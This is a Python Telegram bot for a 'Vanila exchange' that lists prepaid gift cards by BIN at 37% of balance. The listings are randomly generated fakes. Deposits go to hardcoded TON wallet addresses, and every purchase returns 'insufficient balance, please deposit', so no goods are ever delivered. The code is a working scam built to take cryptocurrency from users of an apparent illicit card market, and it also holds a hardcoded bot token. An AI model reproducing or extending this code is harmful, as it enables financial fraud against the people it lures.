
import os
import random
import time
import asyncio
import pytz
from datetime import datetime
from threading import Thread
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, constants
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TOKEN = "8312816041:AAEVEH0u7PL-MELnS3M0KhMGn84y-NBchvY"
ADMIN_URL = "https://t.me/vanilarefu"
SUPPORT_URL = "https://t.me/Vanilagcm"
TON_ADDRESSES = [
    "UQCgPsBnvSib5rYln5vK0rNfYo__xjfk5OD-0mKU7-n1ACnT",
    "UQCCTTF03CCeyNKov1azQty5iNcNMnwH72J7pcb7MUaDKXsd",
    "UQAZjMCIT6MEMUgvKmweTySPrGqxnUrgvG5JQVUfnR-d_tke",
    "UQBwwD_2VekRaM-7_6wwltzkboxbTiYDqif40G9Tbnq76Td1",
    "UQAMBt7k1FZHvewkpB1IHMLiOMLZR63rO_NKv-fiQ0n5EGW_",
    "UQC9OvldFlHMbxKRq-6yRTm9uWv-YWFcsywHQAZz6p9dtonc"
]

BINS = {
    "JOKER": ["533985xx", "461126xx"],
    "AMEX": ["373778xx", "377935xx", "375163xx"],
    "VANILA": ["411810xx", "409758xx", "520356xx", "525362xx", "484718xx", "545660xx"],
    "CARDBALANCE": ["428313xx", "432465xx", "457824xx"],
    "WALMART": ["485246xx"],
    "GCM": ["451129xx", "403446xx", "435880xx", "511332xx"],
    "OTHER": ["491277xx", "533621xx", "446317xx", "516612xx", "402372xx", "457851xx"]
}

# --- GLOBAL DATA ---
cached_cards = []
last_update_time = None

# --- FLASK SERVER ---
app = Flask('')
@app.route('/')
def home(): return "Bot is Alive!"
def run(): app.run(host='0.0.0.0', port=8080)

# --- UTILS ---
def is_updating():
    tz = pytz.timezone('Asia/Dhaka')
    now = datetime.now(tz)
    return now.hour == 3 and 0 <= now.minute <= 10

def generate_cards():
    global cached_cards
    cards = []
    total = random.randint(200, 250)
    all_bins = [b for sub in BINS.values() for b in sub]
    
    # logic based on user request
    # 500$ cards (10-12)
    for _ in range(random.randint(10, 12)):
        cards.append(create_card_data(300, 500, no_sticker=True))
    # 20$ cards (20-30)
    for _ in range(random.randint(20, 30)):
        cards.append(create_card_data(19, 21))
    # 0.99 below (15-20)
    for _ in range(random.randint(15, 20)):
        cards.append(create_card_data(0.10, 0.99))
    # Most common 5-40$
    for _ in range(100):
        cards.append(create_card_data(5, 40))
    # Remaining
    while len(cards) < total:
        cards.append(create_card_data(1, 299))
    
    cards.sort(key=lambda x: x['bal'], reverse=True)
    
    # Set Unreg status for 20% random (mostly low bal)
    for c in cards:
        if c['bal'] < 15 and random.random() < 0.2:
            c['unreg'] = True
        else:
            c['unreg'] = False
            
    cached_cards = cards

def create_card_data(mi, ma, no_sticker=False):
    all_bins = [b for sub in BINS.values() for b in sub]
    bin_val = random.choice(all_bins)
    cur = "CAD" if bin_val in BINS["JOKER"] else ("AUD" if bin_val in BINS["AMEX"] else "USD")
    bal = round(random.uniform(mi, ma), 2)
    
    sticker = ""
    if not no_sticker:
        r = random.random()
        if r < 0.10: sticker = "🔄"
        elif r < 0.15: sticker = "🅶 🅿"
        elif r < 0.23: sticker = "🔄 🅶"
        elif r < 0.27: sticker = "🅿"
        elif r < 0.35: sticker = "🅶"
        
    return {"bin": bin_val, "cur": cur, "bal": bal, "sticker": sticker, "stock": True}

# --- HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = (f"⚡️Welcome {user.first_name} to Vanila exchange ! ⚡️\n"
            f"Sell, Buy, and strike deals in seconds!!\n"
            f"All transactions are secure and transparent.\n"
            f"All types of cards are available here at best rates. Current rate is 37%")
    kb = [[InlineKeyboardButton("💳 Stock", callback_query_data="stock_0"),
           InlineKeyboardButton("📞 Contact Admin", url=ADMIN_URL)]]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb))

async def stock_view(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if is_updating():
        await query.answer("The bot is currently updating, please wait", show_alert=True)
        return
    
    data = query.data.split("_")
    page = int(data[1])
    filter_type = data[2] if len(data) > 2 else "None"
    
    # Filter Logic
    filtered = cached_cards
    if filter_type == "Unregistered": filtered = [c for c in filtered if c.get('unreg')]
    elif filter_type == "Registered": filtered = [c for c in filtered if not c.get('unreg')]
    elif filter_type in BINS: filtered = [c for c in filtered if c['bin'] in BINS[filter_type]]

    total_pages = (len(filtered) + 9) // 10
    start_idx = page * 10
    end_idx = start_idx + 10
    page_items = filtered[start_idx:end_idx]
    
    page_bal = sum(item['bal'] for item in page_items)
    
    text = f"⚡️ VANILA Exchange - Main Listings V2 ⚡️\n\n"
    text += f"Your Balance:\n💵 USD: `$0.00` \n• TON : `0.000000` ($0.00)\n\n"
    
    kb = []
    for i, c in enumerate(page_items, start=start_idx+1):
        line = f"{i}. `{c['bin']}` {c['cur']}${c['bal']:.2f} at 37% {c['sticker']}\n"
        text += line
        # Button row for each card
        btn_text = f"🛒 Purchase" if c['stock'] else "⚠️ OUT OF STOCK"
        kb.append([InlineKeyboardButton(f"{i}. {c['bin']}", callback_query_data="none"),
                   InlineKeyboardButton(btn_text, callback_query_data="buy")])
    
    text += f"\nTotal Cards: {len(cached_cards)} | Total Cards Balance: ${page_bal:.2f}\n"
    text += f"Legend: 🔄=Re-listed, 🅶=Google, 🅿=PayPal\n"
    text += f"Filters: {filter_type}\n"
    text += f"Page: {page+1}/{total_pages} | Updated: {datetime.now().strftime('%H:%M:%S')}"
    
    # Nav Buttons
    nav = [
        InlineKeyboardButton("First↩️", callback_query_data=f"stock_0_{filter_type}"),
        InlineKeyboardButton("Back⬅️", callback_query_data=f"stock_{max(0, page-1)}_{filter_type}"),
        InlineKeyboardButton("Next➡️", callback_query_data=f"stock_{min(total_pages-1, page+1)}_{filter_type}"),
        InlineKeyboardButton("Last↪️", callback_query_data=f"stock_{total_pages-1}_{filter_type}")
    ]
    kb.append(nav)
    kb.append([InlineKeyboardButton("💰 Deposit", callback_query_data="dep"),
               InlineKeyboardButton("Refresh🔂", callback_query_data=f"stock_{page}_{filter_type}"),
               InlineKeyboardButton("🔍 Filters", callback_query_data="show_filters")])
    
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

async def show_filters(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton("🔐Unregistered", callback_query_data="stock_0_Unregistered"), 
         InlineKeyboardButton("🔓Registered", callback_query_data="stock_0_Registered")],
        [InlineKeyboardButton("⚪Vanilla", callback_query_data="stock_0_VANILA"),
         InlineKeyboardButton("💠CardBalance", callback_query_data="stock_0_CARDBALANCE")],
        [InlineKeyboardButton("☀️Walmart", callback_query_data="stock_0_WALMART"),
         InlineKeyboardButton("🛍️ GiftCardMall", callback_query_data="stock_0_GCM")],
        [InlineKeyboardButton("🎭Joker", callback_query_data="stock_0_JOKER"),
         InlineKeyboardButton("🟦AMEX", callback_query_data="stock_0_AMEX")],
        [InlineKeyboardButton("🏠Clear Filters", callback_query_data="stock_0_None")]
    ]
    await update.callback_query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(kb))

async def deposit_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    addr = random.choice(TON_ADDRESSES)
    text = (f"⚡ VANILA Exchange — TON DEPOSIT ⚡\n\n"
            f"Deposit Information: `{addr}`\n\n"
            f"Minimum Deposit: `15 TON` \n"
            f"Instructions: Send TON through TON Network. Valid for 30 mins.")
    kb = [[InlineKeyboardButton("Confirm✅", callback_query_data="confirm_dep"),
           InlineKeyboardButton("cancel ⛔", callback_query_data="cancel_dep")]]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = (f"⚡ VANILA PROFILE ⚡\n\n👤 {user.first_name}\n"
            f"🆔 User ID: `{user.id}`\n🔹 Username: @{user.username}\n"
            f"💰 TON Balance: `0.00` \n💵 USD Total: `$0.00` \n"
            f"👥 Referred By: `https://t.me/share/url?url=t.me/YourBot?start={user.id}`")
    await update.message.reply_text(text, parse_mode='Markdown')

async def buy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer("Insufficient balance, please deposit", show_alert=True)

# --- MAIN RUNNER ---
async def main():
    generate_cards()
    Thread(target=run).start()
    
    app_tg = Application.builder().token(TOKEN).build()
    
    # Handlers
    app_tg.add_handler(CommandHandler("start", start))
    app_tg.add_handler(CommandHandler("profile", profile))
    app_tg.add_handler(CommandHandler("deposit", deposit_cmd))
    app_tg.add_handler(CommandHandler("listings", lambda u, c: start(u, c))) # Example
    app_tg.add_handler(CallbackQueryHandler(stock_view, pattern="^stock_"))
    app_tg.add_handler(CallbackQueryHandler(show_filters, pattern="show_filters"))
    app_tg.add_handler(CallbackQueryHandler(buy_callback, pattern="buy"))
    
    # Background update checker
    async def update_cards_task():
        while True:
            if is_updating():
                generate_cards()
                await asyncio.sleep(600) # Sleep 10 mins
            await asyncio.sleep(30)
            
    asyncio.create_task(update_cards_task())
    
    await app_tg.initialize()
    await app_tg.start()
    await app_tg.updater.start_polling()
    await asyncio.Event().wait()

if __name__ == '__main__':
    asyncio.run(main())
